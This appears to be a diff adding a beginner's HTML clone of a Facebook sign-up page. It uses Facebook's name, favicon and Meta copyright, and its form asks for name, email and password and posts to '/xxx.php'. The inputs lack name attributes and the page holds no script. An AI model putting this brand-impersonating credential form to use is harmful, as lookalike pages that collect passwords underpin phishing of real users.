@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="English">
+    <head>
+        <title> facebook </title>
+        <link rel="icon" type="image/x-icon" href="https://facebook.com/favicon.ico">
+        <style>
+            form,input{
+                margin: 5px; 
+                padding: 5px ;
+                border-radius: 5px;
+                border-color: lightgray;
+            }
+            label{
+                margin: 10px;
+                padding: 10px;
+                font-weight: bold;
+            }
+
+            .contact{
+                float: left; 
+                margin: 10px; 
+                padding: auto
+            }
+
+            .sign {
+                color:black; 
+                border: 2px solid gray; 
+                background-color: beige; 
+                text-align: center;
+            }
+        </style>
+         
+    </head>
+    <body>  
+        <img src="https://www.facebook.com/favicon.ico"  alt="facebook.favicon" width="auto" height="auto" style="float: left;"><br>
+
+        <h1 >Facebook</h1>
+        <div>
+            <p title="login" class="sign">
+                create facebook account <br>
+                <!-- form -->
+                <form action="/xxx.php" method="post" target="_self" style="border: 2px solid lightgray">
+                    <label for="fname">First name:</label><br>
+                    <input type="text" id="fname"><br>
+                    <label for="lname">Last name:</label><br>
+                    <input type="text" id="lname"><br>
+                    <label for="email">Email address:</label><br>
+                    <input type="text" id="email"><br>
+                    <label for="pass">password:</label><br>
+                    <input type="password" id="pass"><br>
+                    <label for="gender">Gender</label>
+                    <select>
+                        <option>man</option>
+                        <option>woman</option>
+                    </select><br>
+                    <label for="ploicy">do accept our policy</label>
+                    <input type="checkbox" id="policy" style="float: left;"><br>
+                    <input type="submit" value="Submit">
+                </form>
+                <a href="mailto:zyadelsayed@gmail.com">contact us!</a>
+                
+            </p>
+        </div>
+
+        <button title="email" onmouseover="document.location='mailto:zyadelsayed@gmail.com'" class="contact">contact us!</button>
+
+        <hr>
+
+        <div>
+            <p style="color: #7a0099;">
+            English (UK)
+            العربية
+            Français (France)
+            Italiano
+            Deutsch
+            Русский
+            Español
+            Bahasa Indonesia
+            Türkçe
+            Português (Brasil)
+            हिन्दी
+            Meta © 2023
+            </p>
+        </div>
+    </body>
+</html>
